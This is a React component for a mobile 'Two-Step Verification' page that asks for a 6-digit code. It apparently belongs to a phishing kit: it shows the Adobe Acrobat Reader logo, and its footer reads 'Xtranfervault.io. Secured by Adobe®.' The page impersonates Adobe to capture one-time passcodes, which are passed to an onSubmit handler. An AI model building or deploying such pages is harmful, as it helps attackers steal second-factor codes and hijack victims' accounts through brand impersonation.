import React, { useState } from 'react';
import Spinner from '@/components/common/Spinner';
import OtpInput from '@/components/common/OtpInput';
import { ShieldCheck } from 'lucide-react';

interface MobileOtpPageProps {
  onSubmit: (otp: string) => void;
  isLoading: boolean;
  errorMessage?: string;
  email?: string;
}

const AdobeLogo = () => (
  <img 
    src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/60/Adobe_Acrobat_Reader_icon_%282020%29.svg/640px-Adobe_Acrobat_Reader_icon_%282020%29.svg.png" 
    alt="Adobe Acrobat Reader Logo" 
    className="w-10 h-10 drop-shadow-lg"
  />
);

const MobileOtpPage: React.FC<MobileOtpPageProps> = ({ onSubmit, isLoading, errorMessage, email }) => {
  const [otp, setOtp] = useState('');

  const handleOtpComplete = (completedOtp: string) => {
    setOtp(completedOtp);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length === 6) {
      onSubmit(otp);
    }
  };

  return (
    <div 
      className="min-h-screen flex flex-col justify-end font-sans bg-cover bg-center"
      style={{
        backgroundImage: "url('https://images.unsplash.com/photo-1554147090-e1221a04a025?auto=format&fit=crop&w=2070&q=80')"
      }}
    >
        <>
          <div className="bg-black/30 backdrop-blur-xl p-6 text-center border-t border-white/10">
            <div className="flex justify-center mb-4">
              <AdobeLogo />
            </div>
            <h1 className="text-xl font-bold text-white">Two-Step Verification</h1>
            <p className="text-gray-300 mt-2 text-sm font-medium">
              Enter the 6-digit code to continue.
            </p>
          </div>

          <div className="bg-gradient-to-t from-gray-900/50 to-gray-800/40 backdrop-blur-2xl rounded-t-3xl shadow-2xl p-6 flex-grow-0 border-t border-white/10">
            <form onSubmit={handleSubmit} className="space-y-6">
              {errorMessage && ( <div className="bg-red-500/30 text-red-100 p-3 rounded-lg text-sm font-medium text-center border border-red-400/50"> {errorMessage} </div> )}
              
              <div className="pt-4">
                 <OtpInput length={6} onComplete={handleOtpComplete} disabled={isLoading} />
              </div>
              
              <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full flex items-center justify-center py-4 px-4 rounded-xl font-bold text-white bg-blue-600 hover:bg-blue-700 disabled:opacity-50 transition-colors shadow-lg shadow-blue-500/40">
                {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
                {isLoading ? 'Verifying...' : 'Verify Code'}
              </button>
            </form>
          </div>
          <div className="bg-gray-900/50 pt-2 pb-4">
            <p className="text-xs text-gray-400 text-center">© 2026 Xtranfervault.io. Secured by Adobe®.</p>
          </div>
        </>
    </div>
  );
};

export default MobileOtpPage;
